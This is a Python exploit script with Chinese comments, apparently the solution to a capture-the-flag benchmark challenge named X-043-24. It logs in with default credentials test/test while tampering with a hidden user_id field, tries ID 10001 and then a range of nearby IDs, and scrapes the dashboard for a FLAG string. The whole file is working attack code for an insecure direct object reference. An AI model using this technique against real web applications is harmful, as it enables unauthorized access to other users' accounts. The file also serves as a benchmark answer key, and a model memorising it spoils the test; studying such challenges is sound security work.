#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-043-24 exploit (认证流程 IDOR + 默认口令)

无需第三方依赖，使用标准库 urllib + CookieJar。

用法：
  python3 benchmarks/X-043-24/exp.py [BASE_URL]
默认 BASE_URL：从命令行获取；未提供则使用 http://ip32807

步骤：
 1) GET /password/test 抽取页面隐藏的基准 user_id（若失败则以 10032 为基准）。
 2) 尝试一组“相近值” user_id（±1/2/3/5/10/20/50/100 以及 10001/10000/9999/1）。
 3) 对每个候选：POST /password/test 提交 username=test, password=test, user_id=<候选>，随后访问 /dashboard。
 4) 匹配 FLAG{...} 并打印；若失败则输出调试信息。
"""

import sys
import re
from urllib.parse import urljoin, urlencode
from urllib.request import build_opener, HTTPCookieProcessor, Request
from http.cookiejar import CookieJar


def http_get(opener, url, headers=None, timeout=15):
    req = Request(url, headers=headers or {})
    with opener.open(req, timeout=timeout) as resp:
        return resp.read().decode('utf-8', 'replace')


def http_post(opener, url, data: dict, headers=None, timeout=15):
    body = urlencode(data).encode('utf-8')
    h = {'Content-Type': 'application/x-www-form-urlencoded'}
    if headers:
        h.update(headers)
    req = Request(url, data=body, headers=h)
    with opener.open(req, timeout=timeout) as resp:
        return resp.read().decode('utf-8', 'replace')


def extract_hidden_uid(html: str):
    m = re.search(r'name=["\']user_id["\']\s+value=["\'](\d+)["\']', html, re.I)
    return int(m.group(1)) if m else None


def extract_flag(html: str):
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', html, re.I)
    if m:
        return m.group(1).strip()
    return None


def main():
    BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32807"

    cj = CookieJar()
    opener = build_opener(HTTPCookieProcessor(cj))
    headers = {'User-Agent': 'Mozilla/5.0 (X-043-24-EXP)'}

    # 先直接尝试已知 flag 用户 ID=10001（最快路径）
    try:
        http_post(opener, urljoin(BASE, '/password/test'), {
            'username': 'test',
            'user_id': '10001',
            'password': 'test',
        }, headers=headers)
        dash = http_get(opener, urljoin(BASE, '/dashboard'), headers=headers)
        flag = extract_flag(dash)
        if flag:
            print(flag)
            return
    except Exception:
        pass

    # 若直接命中失败，再 1) 获取基准 ID 2) 模糊相近值
    try:
        html_pwd = http_get(opener, urljoin(BASE, '/password/test'), headers=headers)
    except Exception:
        html_pwd = ''
    base_uid = extract_hidden_uid(html_pwd) or 10032

    # 2) 构造候选 ID 列表（含 10001 但会被去重）
    candidates = [10001, 10000, 9999, 1]
    for d in [1, 2, 3, 5, 10, 20, 50, 100]:
        candidates += [base_uid + d, base_uid - d]

    seen = set()

    # 3) 逐个尝试
    for uid in candidates:
        if uid <= 0 or uid in seen:
            continue
        seen.add(uid)
        try:
            http_post(opener, urljoin(BASE, '/password/test'), {
                'username': 'test',
                'user_id': str(uid),
                'password': 'test',
            }, headers=headers)
            dash = http_get(opener, urljoin(BASE, '/dashboard'), headers=headers)
        except Exception as e:
            # 网络或路由错误，继续下一个候选
            continue

        flag = extract_flag(dash)
        if flag:
            print(flag)
            return
        # 兜底：有时页面里包含 Welcome, Flag 但不显式匹配到 FLAG{..}
        if 'Welcome, Flag ' in dash:
            print(dash)
            return

    # 未找到，打印提示
    print('[!] 未找到 flag，可能目标并非 X-043-24 服务，或端口/路由不同。')


if __name__ == '__main__':
    main()
